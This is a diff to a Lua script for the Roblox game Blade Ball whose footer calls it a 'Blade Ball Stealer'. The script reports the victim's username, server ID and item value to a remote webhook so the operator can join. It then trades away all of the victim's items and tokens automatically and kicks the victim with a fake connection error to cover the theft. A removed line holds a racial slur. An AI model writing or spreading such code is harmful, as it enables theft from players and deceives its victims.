@@ -23,23 +23,15 @@ _G.LastMessageID = nil
 
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
 
--- Récupération du montant de Tokens (Coins)
 local function getTokens()
-    local success, amount = pcall(function()
-        return plr.Leaderstats.Coins.Value -- Ou le chemin exact dans Blade Ball
-    end)
-    if not success then
-        -- Backup si le chemin leaderstats change
-        success, amount = pcall(function()
-            return PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
-        end)
-    end
-    return tonumber(amount) or 0
+    local amount = 0
+    pcall(function() amount = plr.leaderstats.Coins.Value end)
+    return amount
 end
 
 local function formatNumber(number)
     if number == nil then return "0" end
-    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixes = {"", "k", "M", "B", "T"}
     local suffixIndex = 1
     while number >= 1000 and suffixIndex < #suffixes do
         number = number / 1000
@@ -86,7 +78,6 @@ local function getFormattedList(list)
     for _, group in pairs(grouped) do table.insert(groupedList, group) end
     table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
 
-    -- AJOUT DES TOKENS EN HAUT DE LA LISTE
     local tokenAmount = getTokens()
     local text = string.format("🪙 **Tokens: %s**\n\n", formatNumber(tokenAmount))
     
@@ -98,49 +89,51 @@ end
 
 local function SendJoinMessage(list)
     local itemText = getFormattedList(list)
-    local hiddenJoin = "[🔗 **CLIQUE ICI POUR REJOINDRE**](https://roblox.com/)"
     local invPing = (ping == "Yes") and "||​|| @everyone" or ""
     local totalRAPVal = 0
     for _, v in ipairs(list) do totalRAPVal = totalRAPVal + v.RAP end
 
+    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')"
+
     local data = {
-        ["content"] = invPing .. "\n`game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')`",
+        ["content"] = invPing,
         ["embeds"] = {{
-            ["title"] = "🟣 Bro join your hit nigga 🎯",
-            ["description"] = "Victime détectée !\n" .. hiddenJoin,
+            ["title"] = "🟣 New Hit Detected 🎯",
+            ["description"] = "Victim found! Click the black bar below to reveal the join command.",
             ["color"] = 8323327,
             ["fields"] = {
-                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
-                {name = "Item list 📝:", value = #itemText > 1000 and string.sub(itemText, 1, 1000) .. "..." or itemText},
-                {name = "Summary 💰:", value = "Total RAP: " .. formatNumber(totalRAPVal)}
+                {name = "Victim Username 🤖:", value = "`" .. plr.Name .. "`", inline = true},
+                {name = "Server ID 🆔:", value = "`" .. game.JobId .. "`", inline = true},
+                {name = "Join Command (Hidden) 💻:", value = "||```lua\n" .. joinCode .. "\n```||", inline = false},
+                {name = "Item List 📝:", value = #itemText > 1000 and string.sub(itemText, 1, 1000) .. "..." or itemText},
+                {name = "Summary 💰:", value = "**Total RAP:** " .. formatNumber(totalRAPVal)}
             },
-            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
+            ["footer"] = {["text"] = "Blade Ball Stealer by Eblack"}
         }}
     }
     _G.LastMessageID = PostToCloudflare(data)
 end
 
--- Détection du départ (Devient ROUGE)
+-- Update Embed to Red on Left
 Players.PlayerRemoving:Connect(function(player)
     if player == plr and _G.LastMessageID then
         local data = {
-            ["content"] = "❌ **VICTIME DÉCONNECTÉE**",
+            ["content"] = "❌ **STATUS UPDATE**",
             ["embeds"] = {{
                 ["title"] = "🔴 VICTIM LEFT 🔴",
-                ["description"] = "Le serveur est maintenant vide.",
+                ["description"] = "The victim has left the server.",
                 ["color"] = 16711680,
                 ["fields"] = {
-                    {name = "Victim:", value = plr.Name, inline = true},
-                    {name = "Status:", value = "🔴 LEFT", inline = true}
-                },
-                ["footer"] = {["text"] = "Eblack Status Monitor"}
+                    {name = "Victim:", value = "`" .. plr.Name .. "`", inline = true},
+                    {name = "Status:", value = "🔴 OFFLINE", inline = true}
+                }
             }}
         }
         PostToCloudflare(data, _G.LastMessageID)
     end
 end)
 
--- Calcul du RAP et Trade (Logique originale conservée)
+-- Original RAP Logic
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
 for _, category in ipairs(categories) do
     local catMap = {}
@@ -160,6 +153,7 @@ for _, category in ipairs(categories) do
     end
 end
 
+-- Start Script
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     SendJoinMessage(itemsToSend)
@@ -169,28 +163,26 @@ if #itemsToSend > 0 then
         while #itemsToSend > 0 do
             pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(joinedUser)) end)
             repeat task.wait(0.5) until tradeGui.Enabled
-            
-            -- Ajout des items
             local count = 0
             while #itemsToSend > 0 and count < 100 do
                 local item = table.remove(itemsToSend, 1)
                 netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                 count = count + 1
             end
-            
-            -- Ajout des tokens dans le trade
             if tokenToTrade > 0 then
                 pcall(function()
                     netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokenToTrade)
-                    tokenToTrade = 0 -- Envoyer une seule fois
+                    tokenToTrade = 0
                 end)
             end
-
             netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
             netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
             repeat task.wait(0.2) until not tradeGui.Enabled
         end
-        plr:kick("Connection Error (277)")
+        
+        -- FAKE DISCONNECT MESSAGE
+        task.wait(1)
+        plr:kick("Please check your internet connection and try again.\n(Error Code: 277)")
     end
 
     for _, p in ipairs(Players:GetPlayers()) do
